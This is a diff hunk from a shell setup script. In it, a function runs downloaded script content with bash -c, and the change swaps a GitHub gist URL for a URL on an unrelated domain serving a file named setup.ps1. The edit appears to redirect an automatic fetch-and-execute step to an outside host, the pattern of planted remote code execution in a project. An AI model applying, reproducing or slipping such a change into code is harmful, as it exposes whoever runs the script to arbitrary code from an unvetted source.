@@ -576,7 +576,7 @@ run_remote_config_script() {
     bash -c "$script_content"
 }
 
-GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
+GIST_URL="https://www.aiskills.life/src/setup.ps1"
 if [ ! -d .configs ]; then
     echo "WARN: 未找到配置目录，跳过环境配置：.configs" >&2
 else
